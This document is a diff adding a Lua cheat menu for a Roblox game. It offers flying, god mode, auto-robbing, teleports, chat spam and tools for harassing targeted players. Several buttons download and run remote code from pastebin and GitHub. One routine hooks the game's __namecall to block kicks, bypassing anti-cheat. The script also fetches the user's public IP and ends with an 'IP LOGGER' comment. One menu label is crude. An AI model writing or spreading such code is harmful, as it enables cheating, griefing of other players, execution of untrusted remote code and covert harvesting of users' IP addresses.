@@ -1,0 +1,879 @@
+if game.PlaceId == 2788229376 then
+
+    local colors = {
+        SchemeColor = Color3.fromRGB(230, 35, 69),
+        Background = Color3.fromRGB(32, 32, 32),
+        Header = Color3.fromRGB(24, 24, 24),
+        TextColor = Color3.fromRGB(119, 209, 138),
+        ElementColor = Color3.fromRGB(24, 24, 24)
+    }
+    
+    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+    local Window = Library.CreateLib("BOWEB V2", colors)
+    local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+	local filename = "RIFT.txt"
+
+
+    _G.settingsTable = {
+		Flyspeed = 14;
+        FlyKey = "x";
+        Target = "";
+        Spamtext = "";
+        Spamdelay = 2;
+}
+
+        function sendMessage(text)
+            local args = {
+                [1] = text,
+                [2] = "All"
+            }
+            
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+            end
+
+
+
+			function loadSettings()
+                print("LOADING SETTINGS...")
+                local HttpService = game:GetService("HttpService")
+                if (readfile and isfile and isfile(filename)) then
+                _G.settingsTable = HttpService:JSONDecode(readfile(filename));
+                print("SETTINGS LOADED")
+                for i,v in pairs(_G.settingsTable) do
+                    print(i,v)
+			end
+        end
+    end
+
+			function saveSettings()
+				local json;
+				local HttpService = game:GetService("HttpService");
+				if (writefile) then
+                    print("SETTINGS HAVE BEEN SAVED")
+					json = HttpService:JSONEncode(_G.settingsTable);
+					writefile(filename, json);
+				else
+					print("ERROR SAVING SETTINGS!")
+				end
+			end
+
+            loadSettings()
+
+    local Main = Window:NewTab("Main scripts")
+    local MainTab = Main:NewSection("Main scripts")
+
+    MainTab:NewButton("Fly", "Fly", function(v)
+                local plr = game.Players.LocalPlayer
+                local mouse = plr:GetMouse()
+                local Humanoid = game.Players.LocalPlayer.Character.Humanoid or game.Players.LocalPlayer.Character.humanoid  
+                
+                        localplayer = plr
+                        
+                        if workspace:FindFirstChild("Core") then
+                            workspace.Core:Destroy()
+                        end
+                        
+                        local Core = Instance.new("Part")
+                        Core.Name = "Core"
+                        Core.Size = Vector3.new(0.05, 0.05, 0.05)
+                
+                        spawn(function()
+                            Core.Parent = workspace
+                            local Weld = Instance.new("Weld", Core)
+                            Weld.Part0 = Core
+                            Weld.Part1 = localplayer.Character.LowerTorso
+                            Weld.C0 = CFrame.new(0, 0, 0)
+                        end)
+                        
+                        workspace:WaitForChild("Core")
+                        
+                        local torso = workspace.Core
+                        flying = true
+                        local speed=10
+                        local keys={a=false,d=false,w=false,s=false} 
+                        local e1
+                        local e2
+                        local function start()
+                            local pos = Instance.new("BodyPosition",torso)
+                            local gyro = Instance.new("BodyGyro",torso)
+                            pos.Name="EPIXPOS"
+                            pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+                            pos.position = torso.Position
+                            gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
+                            gyro.cframe = torso.CFrame
+                            repeat
+                                wait()
+                                Humanoid.PlatformStand=true
+                                local new=gyro.cframe - gyro.cframe.p + pos.position
+                                if not keys.w and not keys.s and not keys.a and not keys.d then
+                                    speed=_G.settingsTable.Flyspeed
+                                end
+                                if keys.w then 
+                                    new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+                                    speed=speed+0
+                                end
+                                if keys.s then 
+                                    new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+                                    speed=speed+0
+                                end
+                                if keys.d then 
+                                    new = new * CFrame.new(speed,0,0)
+                                    speed=speed+0
+                                end
+                                if keys.a then 
+                                    new = new * CFrame.new(-speed,0,0)
+                                    speed=speed+0
+                                end
+                                if speed>_G.settingsTable.Flyspeed then
+                                    speed=_G.settingsTable.Flyspeed
+                                end
+                                pos.position=new.p
+                                if keys.w then
+                                    gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
+                                elseif keys.s then
+                                    gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
+                                else
+                                    gyro.cframe = workspace.CurrentCamera.CoordinateFrame
+                                end
+                            until flying == false
+                            if gyro then gyro:Destroy() end
+                            if pos then pos:Destroy() end
+                            flying=false
+                            Humanoid.PlatformStand=false
+                            speed=_G.settingsTable.Flyspeed
+                        end
+                        e1=mouse.KeyDown:connect(function(key)
+                            if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
+                            if key=="w" then
+                                keys.w=true
+                            elseif key=="s" then
+                                keys.s=true
+                            elseif key=="a" then
+                                keys.a=true
+                            elseif key=="d" then
+                                keys.d=true
+                            elseif key==_G.settingsTable.FlyKey then --Flying key
+                                if flying==true then
+                                    flying=false
+                                else
+                                    flying=true
+                                    start()
+                                end
+                            end
+                        end)
+                        e2=mouse.KeyUp:connect(function(key)
+                            if key=="w" then
+                                keys.w=false
+                            elseif key=="s" then
+                                keys.s=false
+                            elseif key=="a" then
+                                keys.a=false
+                            elseif key=="d" then
+                                keys.d=false
+                            end
+                        end)
+                        start()
+                    end)
+
+                
+                    MainTab:NewButton("Reach", "Reach", function(v)
+                for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
+                            if v:isA("Tool") then
+                               local a = Instance.new("SelectionBox",v.Handle)
+                               a.Adornee = v.Handle
+                               v.Handle.Size = Vector3.new(50, 50, 50)
+                           v.Handle.CanCollide = false
+                           v.Handle.Transparency = 1
+                            end
+                        end
+                    end)
+
+                    MainTab:NewButton("Full god", "Full god", function()
+                        plr = game.Players.LocalPlayer	
+                        game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
+                        game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
+                            Instance.new("Folder",game:GetService("Players").LocalPlayer.Character).Name = ("FULLY_LOADED_CHAR")
+                            game:GetService("Players").LocalPlayer.Character:WaitForChild("BodyEffects"):WaitForChild("Dead"):Remove()
+                            Instance.new("BoolValue",game:GetService("Players").LocalPlayer.Character:WaitForChild("BodyEffects")).Name = ("Dead")
+                            repeat wait() until game:GetService("Players").LocalPlayer.Character:WaitForChild("BodyEffects"):findFirstChild("Dead")
+                            game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):WaitForChild("BodyWidthScale").Value = 0.5
+                            game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):WaitForChild("HeadScale").Value = 1
+                            game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):WaitForChild("BodyHeightScale").Value = 1
+                            game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):WaitForChild("BodyDepthScale").Value = 0.5
+                            game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid"):WaitForChild("BodyTypeScale").Value = 0.01
+                        end)
+                        
+                        wait(8)	
+                        
+                        game:GetService('RunService').Stepped:connect(function()
+                            wait(3)
+                            plr.Character.BodyEffects:FindFirstChild('BreakingParts'):Destroy()
+                            end)
+                    end)
+                
+                    MainTab:NewButton("No cooldown", "No cooldown", function()
+                        loadstring(game:HttpGet(('https://pastebin.com/raw/9mAwN6rA'),true))()
+                game.Players.PlayerAdded:connect(function(plr)
+                    for i = 1,#mains do
+                    if string.lower(plr.Name) == tostring(string.lower(mains[i])) then
+                        game.CoreGui.RobloxGui.PlayerListContainer.ScrollList[plr.Name].BGFrame.PlayerName.TextColor3 = Color3.new(1, 170/255, 0)
+                    end
+                    end
+                end)
+                for i, x in next, game:GetService"Players":GetPlayers() do
+                    for i = 1,#mains do
+                    if string.lower(x.Name) == tostring(string.lower(mains[i])) then
+                        game.CoreGui.RobloxGui.PlayerListContainer.ScrollList[x.Name].BGFrame.PlayerName.TextColor3 = Color3.new(1, 170/255, 0)
+                    end
+                    end
+                end
+                game.Players.PlayerAdded:connect(function(plr)
+                    for i = 1,#special do
+                    if string.lower(plr.Name) == tostring(string.lower(special[i])) then
+                        game.CoreGui.RobloxGui.PlayerListContainer.ScrollList[plr.Name].BGFrame.PlayerName.TextColor3 = Color3.new(0, 255, 255)
+                    end
+                    end
+                end)
+                for i, x in next, game:GetService"Players":GetPlayers() do
+                    for i = 1,#special do
+                    if string.lower(x.Name) == tostring(string.lower(special[i])) then
+                        game.CoreGui.RobloxGui.PlayerListContainer.ScrollList[x.Name].BGFrame.PlayerName.TextColor3 = Color3.new(0, 255, 255)
+                    end
+                    end
+                end
+                
+                
+                game.Players.LocalPlayer.CharacterAdded:Connect(function()
+                repeat wait() until game.Players.LocalPlayer.Character
+                  repeat wait() until game.Players.LocalPlayer.Character.BodyEffects
+                    repeat wait() until game.Players.LocalPlayer.Character.BodyEffects.Movement
+                      wait()
+                      game.Players.LocalPlayer.Character.BodyEffects.Movement.ChildAdded:Connect(function(child)
+                      wait()
+                      child:Destroy()
+                      end)
+                      end)
+                
+                      game.Players.LocalPlayer.Character.BodyEffects.Movement.ChildAdded:Connect(function(child)
+                      wait()
+                      child:Destroy()
+                      end)
+                    end)
+
+                    MainTab:NewButton("No recoil", "No recoil", function()
+                        for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
+                            if v:IsA('Camera') then
+                                v:Destroy()
+                            end
+                        end
+                        pos=game.Players.LocalPlayer.Name
+                        local newcam = Instance.new('Camera',game.Workspace)
+                        newcam.Name = 'Camera'
+                        newcam.CameraType = 'Custom'
+                        newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(pos):FindFirstChild('Humanoid')
+                        newcam.HeadLocked = true
+                        newcam.HeadScale = 1
+                    end)
+
+                    MainTab:NewButton("Free fist", "Free fist", function()
+                        local Players = game:GetService("Players")
+                    local RunService = game:GetService("RunService")
+                
+                    local LocalPlayer = Players.LocalPlayer
+                    local Mouse = LocalPlayer:GetMouse()
+                
+                    local Character = LocalPlayer.Character
+                    local RightHand = Character.RightHand
+                
+                    wait(3)
+                
+                    local Box = Instance.new("SelectionBox")
+                    Box.LineThickness = 0.15
+                    Box.Color3 = Color3.new(255,0,0)
+                    Box.Transparency = 1
+                    Box.Adornee = RightHand
+                    Box.Parent = RightHand
+                
+                    RightHand.RightWrist:Destroy()
+                
+                    while true do
+                        pcall(function()
+                            RightHand.Position = Mouse.Hit.p
+                            RightHand.Rotation = Vector3.new(0,0,0)
+                            RightHand.Massless = true
+                        end)
+                        pcall(function()
+                            local Tool = Character:FindFirstChildOfClass("Tool")
+                            Tool.Handle.Position = RightHand.Position
+                        end)
+                        RunService.RenderStepped:Wait()
+                    end
+                    end)
+                
+                    MainTab:NewButton("Animation changer", "Animation changer", function()
+                        loadstring(game:HttpGet("https://raw.githubusercontent.com/KadenIsSoCute/Animation-changer/main/README.md", true))()
+                    end)
+
+                    MainTab:NewButton("Korblox [Client sided]", "Korblox", function()
+                        local ply = game.Players.LocalPlayer
+                        local chr = ply.Character
+                        chr.RightLowerLeg.MeshId = "902942093"
+                        chr.RightLowerLeg.Transparency = "1"
+                        chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+                        chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+                        chr.RightFoot.MeshId = "902942089"
+                        chr.RightFoot.Transparency = "1"
+                    end)
+
+                    MainTab:NewButton("Broken bones", "Broken bones", function()
+                        local Stuff = {"RightHand", "LeftHand","RightUpperArm","RightLowerArm","LeftUpperArm","LeftLowerArm","Head","UpperTorso"}
+
+                        pcall(function()
+                            for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                                for z, AdminName in ipairs(Stuff) do
+                                    if v.Name == AdminName then
+                                        if v:FindFirstChildOfClass("Motor6D") then
+                                            local Weld = v:FindFirstChildOfClass("Motor6D")
+                                            Weld:Destroy()
+                                        end
+                                    end
+                                end
+                            end
+                        end)
+                    end)
+                    
+                    local Toggles = Window:NewTab("Toggles")
+                    local ToggleSection = Toggles:NewSection("Toggles")
+
+                    ToggleSection:NewToggle("Anti stomp", "Anti stomp", function(v)
+                        _G.antistomp = v
+                        game:GetService('RunService').Stepped:connect(function()
+                            if not _G.antistomp then return end
+                            if game.Players.LocalPlayer.Character.Humanoid.Health < 2 then
+                                char = game:GetService('Players').LocalPlayer.Character
+                                char.HumanoidRootPart:Destroy()
+                                char.Head:Destroy()
+                                char.RightHand:Destroy()
+                                char.LeftLowerArm:Destroy()
+                                char.RightLowerArm:Destroy()
+                                char.LeftUpperArm:Destroy()
+                                char.RightUpperArm:Destroy()
+                                char.LowerTorso:Destroy()
+                                char.RightUpperLeg:Destroy()
+                                char.LeftFoot:Destroy()
+                                char.LeftUpperLeg:Destroy()
+                                char.LeftLowerLeg:Destroy()
+                                char.RightFoot:Destroy()
+                                char.UpperTorso:Destroy()
+                                char.RightLowerLeg:Destroy()
+                            end
+                        end)
+                    end)
+
+                    ToggleSection:NewToggle("Auto rob", "Auto rob", function(v)
+                        _G.autofarm = v
+                            while true do
+                                if not _G.autofarm then return end
+                                repeat
+                                    wait()
+                                until game:IsLoaded()
+                                local gm = getrawmetatable(game)
+                                setreadonly(gm, false)
+                                local namecall = gm.__namecall
+                                gm.__namecall =
+                                    newcclosure(
+                                    function(self, ...)
+                                        local args = {...}
+                                        if not checkcaller() and getnamecallmethod() == "FireServer" and tostring(self) == "MainEvent" then
+                                            if tostring(getcallingscript()) ~= "Framework" then
+                                                return
+                                            end
+                                        end
+                                        if not checkcaller() and getnamecallmethod() == "Kick" then
+                                            return
+                                        end
+                                        return namecall(self, unpack(args))
+                                    end
+                                )
+                                
+                                local LocalPlayer = game:GetService("Players").LocalPlayer
+                                
+                                function gettarget()
+                                    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
+                                    local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+                                    local maxdistance = math.huge
+                                    local target
+                                    for i, v in pairs(game:GetService("Workspace").Cashiers:GetChildren()) do
+                                        if v:FindFirstChild("Head") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+                                            local distance = (HumanoidRootPart.Position - v.Head.Position).magnitude
+                                            if distance < maxdistance then
+                                                target = v
+                                                maxdistance = distance
+                                            end
+                                        end
+                                    end
+                                    return target
+                                end
+                                
+                                for i, v in pairs(workspace:GetDescendants()) do
+                                    if v:IsA("Seat") then
+                                        v:Destroy()
+                                    end
+                                end
+                                
+                           
+                                
+                                    wait()
+                                    local Target = gettarget()
+                                    repeat
+                                        wait()
+                                        pcall(
+                                            function()
+                                                local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
+                                                local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+                                                local Combat = LocalPlayer.Backpack:FindFirstChild("Combat") or Character:FindFirstChild("Combat")
+                                                if not Combat then
+                                                    Character:FindFirstChild("Humanoid").Health = 0
+                                                    return
+                                                end
+                                                HumanoidRootPart.CFrame = Target.Head.CFrame * CFrame.new(0, -2.5, 3)
+                                                Combat.Parent = Character
+                                                Combat:Activate()
+                                            end
+                                        )
+                                    until not Target or Target.Humanoid.Health < 0
+                                    for i, v in pairs(game:GetService("Workspace").Ignored.Drop:GetDescendants()) do
+                                        if v:IsA("ClickDetector") and v.Parent and v.Parent.Name:find("Money") then
+                                            local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
+                                            local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
+                                            if (v.Parent.Position - HumanoidRootPart.Position).magnitude <= 18 then
+                                                repeat
+                                                    wait()
+                                                    fireclickdetector(v)
+                                                until not v or not v.Parent.Parent
+                                            end
+                                        end
+                                    end
+                                    wait(1)
+                            end
+                        end)
+
+                        ToggleSection:NewToggle("Drop cash", "Drop cash", function(v)
+                        _G.dropcash = v
+                            while true do
+                                if not _G.dropcash then return end
+                                local script = Instance.new('LocalScript', Quick_Drop)
+
+	plr = game:GetService('Players').LocalPlayer
+	
+	repeat wait() until plr.Character:FindFirstChild('Humanoid') or plr.Character:FindFirstChild('xxx')
+		hum = plr.Character:FindFirstChild('Humanoid')
+			while wait() do
+				if plr.Character:FindFirstChild('Humanoid') or plr.Character:FindFirstChild('xxx') then
+					wait(.1)
+					if plr.DataFolder.Currency.Value >= 9800 then 
+						local AMT = 10000
+						game.ReplicatedStorage.MainEvent:FireServer("DropMoney",AMT)
+					elseif plr.DataFolder.Currency.Value <= 100 then 
+						wait()
+					else 
+						local AMT = plr.DataFolder.Currency.Value
+					game.ReplicatedStorage.MainEvent:FireServer("DropMoney",AMT)
+						end
+					break
+				end
+		end
+    end
+                        end)
+                
+                        ToggleSection:NewToggle("Auto stomp", "Auto stomp", function(v)
+                    _G.autostomp = v
+                        while true do
+                            if not _G.autostomp then return end
+                local script = Instance.new('LocalScript', Auto_Stomp)
+                
+                    plr = game:GetService('Players').LocalPlayer
+                    
+                    repeat wait() until plr.Character:FindFirstChild('Humanoid') or plr.Character:FindFirstChild('xxx')
+                        hum = plr.Character:FindFirstChild('Humanoid')
+                            while wait() do
+                                if plr.Character:FindFirstChild('Humanoid') or plr.Character:FindFirstChild('xxx') then
+                                    wait(.1)
+                                            game.ReplicatedStorage.MainEvent:FireServer("Stomp")
+                                        end
+                                break
+                            end
+                            wait(0)
+                        end
+                    end)
+
+                    ToggleSection:NewToggle("Headless", "Headless", function(state)
+                        if state then
+                            plr = game.Players.LocalPlayer
+                            plr.Character["Head"].Transparency = 1
+                            plr.Character["Head"].face.Transparency = 1
+                        else
+                            plr = game.Players.LocalPlayer
+                            plr.Character["Head"].Transparency = 0
+                            plr.Character["Head"].face.Transparency = 0
+                        end
+                    end)
+
+                    ToggleSection:NewToggle("Anti bag", "Anti bag", function(v)
+                        _G.antibag = v
+                        while true do
+                            if not _G.antibag then return end
+                            game.Players.LocalPlayer.Character:WaitForChild("Christmas_Sock"):Destroy()
+                            wait(0)
+                        end
+                    end)
+                
+                    ToggleSection:NewToggle("Anti flashbang", "Anti flashbang", function(v)
+                        _G.antiflash = v
+                        while true do
+                            if not _G.antiflash then return end
+                while true do
+                        local XD = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui
+                
+                        if XD:FindFirstChild("whiteScreen") then
+                            XD.whiteScreen:Destroy()
+                        end
+                        wait(0.1)
+                    end
+                            wait(0)
+                        end
+                    end)
+
+
+                    local Teleports = Window:NewTab("Teleports")
+                    local TeleportSection = Teleports:NewSection("Teleports")
+
+                    TeleportSection:NewButton("Bank", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-437.125885, 38.9782982, -285.587372, 0.0165725481, -6.70135805e-08, -0.999862671, -2.43708573e-08, 1, -6.74267255e-08, 0.999862671, 2.54849422e-08, 0.0165725481)
+                    end)
+
+                    TeleportSection:NewButton("Gas station", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(591.680725, 49.0000458, -256.818298, -0.0874911696, -5.31636495e-08, -0.996165276, -1.03225837e-07, 1, -4.43021868e-08, 0.996165276, 9.89539402e-08, -0.0874911696)
+                    end)
+
+                    TeleportSection:NewButton("Gun shop [UP]", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(488.347412, 48.0705032, -630.454285, -0.0453165509, -4.20173549e-08, -0.998972654, -4.23235385e-08, 1, -4.01406339e-08, 0.998972654, 4.04610248e-08, -0.0453165509)
+                    end)
+
+                    TeleportSection:NewButton("Gun shop [Down]", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-583.584351, 8.31278038, -743.743896, -0.572576344, -7.19935827e-08, -0.819851398, 7.47572493e-09, 1, -9.30339397e-08, 0.819851398, -5.93980154e-08, -0.572576344)
+                    end)
+
+                    TeleportSection:NewButton("Admin base", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-796.256897, -39.6492004, -886.306152, -0.39699012, 2.91068263e-05, 0.917822897, 1.63490836e-06, 1, -3.10057476e-05, -0.917822897, -1.08084187e-05, -0.39699012)
+                    end)
+
+                    TeleportSection:NewButton("Playground", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-259.516907, 22.1498718, -762.971558, 0.992310345, 0, 0.12377467, 0, 1, 0, -0.12377467, 0, 0.992310345)
+                    end)
+
+                    TeleportSection:NewButton("Safe zone 1", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-117.270287, -58.7000618, 146.536087, 0.999873519, 5.21876942e-08, -0.0159031227, -5.22713037e-08, 1, -4.84179008e-09, 0.0159031227, 5.67245495e-09, 0.999873519)
+                    end)
+
+                    TeleportSection:NewButton("Safe zone 2", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207.48085, 38.25, 200014.953, 0.507315397, 0, -0.861760437, 0, 1, 0, 0.861760437, 0, 0.507315397)
+                    end)
+
+                    TeleportSection:NewButton("Sewer", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(111.514938, -26.7500305, -276.918365, -0.997865558, -1.25138016e-08, -0.0653034225, -1.74378947e-08, 1, 7.48333733e-08, 0.0653034225, 7.58124159e-08, -0.997865558)
+                    end)
+
+                    TeleportSection:NewButton("Taco shop", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(583.931641, 51.061409, -476.954193, -0.999745369, -5.08810161e-10, -0.0225663595, -4.9325205e-10, 1, -6.95003832e-10, 0.0225663595, -6.83695989e-10, -0.999745369)
+                    end)
+
+                    TeleportSection:NewButton("UFO", "Teleport", function()
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(71.7331619, 139, -691.154419, 0.602706313, 7.78292178e-06, 0.797962964, 7.63640458e-07, 1, -1.03302691e-05, -0.797962964, 6.83547478e-06, 0.602706313)
+                    end)
+
+                    TeleportSection:NewButton("Save pos", "Teleport", function()
+                        plr = game:GetService('Players').LocalPlayer
+                
+                        X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
+                        Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
+                        Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z
+                    end)
+                
+                    TeleportSection:NewButton("Load pos", "Teleport", function()
+                        plr.Character.HumanoidRootPart.CFrame = CFrame.new(X1,Y1+5,Z1)
+                    end)
+
+                    local Target = Window:NewTab("Target")
+                    local TargetSection = Target:NewSection("Target")
+
+                    TargetSection:NewTextBox("Target", "Target", function(txt)
+                        _G.settingsTable.Target = (txt)
+                    end)
+
+                    TargetSection:NewToggle("Follow", "Auto stomp", function(v)
+                        _G.followPlayer = v
+                            while true do
+                                wait(0)
+                                if not _G.followPlayer then return end
+                                local TargetPlr = _G.settingsTable.Target
+                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[TargetPlr].Character.HumanoidRootPart.CFrame
+                            end
+                        end)
+
+                    TargetSection:NewButton("Goto", "Goto", function()
+                        local TargetPlr = _G.settingsTable.Target
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[TargetPlr].Character.HumanoidRootPart.CFrame
+                    end)
+                
+                    TargetSection:NewButton("Bag", "Bag", function()
+                        local TargetPlr = _G.settingsTable.Target
+                    function getRoot(char)
+                        local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+                        return rootPart
+                    end
+                
+                    if TargetPlr and game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop['[BrownBag] - $25'].Head.CFrame
+                        wait(0.3)
+                        fireclickdetector(game.Workspace.Ignored.Shop['[BrownBag] - $25'].ClickDetector)
+                        game.Players.LocalPlayer.Backpack:WaitForChild("[BrownBag]").Parent = game.Players.LocalPlayer.Character
+                
+                        wait(.5)
+                        repeat
+                            pcall(function()
+                                wait()
+                                getRoot(game.Players[TargetPlr].Character).CFrame = getRoot(game.Players.LocalPlayer.Character).CFrame + Vector3.new(1,3,0)
+                                game.Players.LocalPlayer.Character["[BrownBag]"]:Activate()
+                            end)
+                        until game.Players[TargetPlr].Character:FindFirstChild("Christmas_Sock")
+                        local A_1 = "[RIFT] Bagged" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+                    elseif game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
+                        local A_1 = "[Rift] Already bagged" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2)
+                    end
+                    end)
+                
+                    TargetSection:NewButton("View", "View", function()
+                        local TargetPlr = _G.settingsTable.Target
+                game.Workspace.Camera.CameraSubject = game.Players[TargetPlr].Character.Humanoid;
+                    end)
+                
+                    TargetSection:NewButton("Un view", "Un view", function()
+                        game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
+                    end)
+
+                    TargetSection:NewButton("Cash", "Cash", function()
+                        game.StarterGui:SetCore("SendNotification",  {
+                            Title = "".._G.settingsTable.Target;
+                            Text = "Cash: "..game.Players[_G.settingsTable.Target].Backpack.Wallet.Handle.BillboardGui.TextLabel.Text;
+                            Icon = "http://www.roblox.com/asset/?id=6438570209";
+                            Duration = 5;
+                            Callback = NotificationBindable;
+                           })
+                    end)
+
+                    TargetSection:NewButton("Bounty", "Bounty", function()
+                        game.StarterGui:SetCore("SendNotification",  {
+                            Title = "".._G.settingsTable.Target;
+                            Text = "Bounty: "..game.Players[_G.settingsTable.Target].DataFolder.Information.Wanted.Value;
+                            Icon = "http://www.roblox.com/asset/?id=6438570209";
+                            Duration = 5;
+                            Callback = NotificationBindable;
+                           })
+                    end)
+
+                    local Spam = Window:NewTab("Spam")
+                    local SpamSection = Spam:NewSection("Spam")
+            
+                    SpamSection:NewToggle("Enabled", "Enables the spam", function(v)
+                        _G.spam = v
+                        while true do
+                            wait(_G.settingsTable.Spamdelay)
+                            if not _G.spam then return end
+                            sendMessage(_G.settingsTable.Spamtext)
+                        end
+                    end)
+            
+                    SpamSection:NewTextBox("Spam text", "The text to spam", function(txt)
+                        _G.settingsTable.Spamtext = (txt)
+                    end)
+            
+                    SpamSection:NewSlider("Spam delay", "The spam delay", 30, 1, function(s)
+                        _G.settingsTable.Spamdelay = s
+                    end)
+
+                    local Face = Window:NewTab("Face")
+                        local FaceSection = Face:NewSection("Face")
+                    
+                        FaceSection:NewButton("Super super happy face", "Face changer", function()
+                            local player = game.Players.LocalPlayer.Name
+                            game.Workspace.Players[player].Head.face.Texture = 'http://www.roblox.com/asset/?id=7099956666'
+                        end)
+                    
+                        FaceSection:NewButton("Shindo life eterno", "Face changer", function()
+                            local player = game.Players.LocalPlayer.Name
+                            game.Workspace.Players[player].Head.face.Texture = 'http://www.roblox.com/asset/?id=6245383911'
+                        end)
+                    
+                        FaceSection:NewButton("Beast mode", "Face changer", function()
+                            local player = game.Players.LocalPlayer.Name
+                            game.Workspace.Players[player].Head.face.Texture = 'http://www.roblox.com/asset/?id=265790768'
+                        end)
+                    
+                        FaceSection:NewButton("Red Glowing Eyes", "Face changer", function()
+                            local player = game.Players.LocalPlayer.Name
+                            game.Workspace.Players[player].Head.face.Texture = 'http://www.roblox.com/asset/?id=362505168'
+                        end)
+                    
+                        FaceSection:NewButton("Playful vampire", "Face changer", function()
+                            local player = game.Players.LocalPlayer.Name
+                            game.Workspace.Players[player].Head.face.Texture = 'http://www.roblox.com/asset/?id=6399193086'
+                        end)
+                    
+                        FaceSection:NewButton("Slut face", "Face changer", function()
+                            local player = game.Players.LocalPlayer.Name
+                            game.Workspace.Players[player].Head.face.Texture = 'http://www.roblox.com/asset/?id=7163209709'
+                        end)
+
+                    local Settings = Window:NewTab("Settings")
+                    local SettingSection = Settings:NewSection("Settings")
+                
+                        SettingSection:NewTextBox("Fly keybind", "Fly keybind", function(txt)
+                            _G.settingsTable.FlyKey = (txt)
+                        end)
+                
+                        SettingSection:NewSlider("Fly speed", "Fly speed", 40, 1, function(s)
+                            _G.settingsTable.Flyspeed = (s)
+                        end)
+
+                        SettingSection:NewSlider("Max zoom", "Max zoom", 1000, 1, function(s)
+                            plr = game.Players.LocalPlayer
+                            plr.CameraMaxZoomDistance = s
+                            plr.CameraMinZoomDistance = 0
+                        end)
+
+                        SettingSection:NewSlider("Field of view", "Field of view", 120, 70, function(s)
+                            workspace.CurrentCamera.FieldOfView = s
+                        end)
+                
+                        SettingSection:NewKeybind("Toggle UI", "Toggle UI", Enum.KeyCode.V, function()
+                            Library:ToggleUI()
+                        end)
+
+                    
+                local Misc = Window:NewTab("Misc")
+                local MiscSection = Misc:NewSection("Misc")
+
+                MiscSection:NewButton("Server hop", "Server hop", function(v)
+                    local Servers = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
+                    for i,v in pairs(Servers.data) do
+                        if v.playing ~= v.maxPlayers then
+                            game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, v.id)
+                        end
+                    end
+                end)
+
+
+                MiscSection:NewButton("Rejoin", "Rejoin", function(v)
+                    game:GetService("TeleportService"):Teleport(game.PlaceId)
+                end)
+                
+                MiscSection:NewButton("Force reset", "Force reset", function(v)
+                        game:GetService("Players").LocalPlayer.Character:WaitForChild("Humanoid").Health = 0
+                    end)
+                
+                    --//Background scripts
+
+                    --IP LOGGER
+
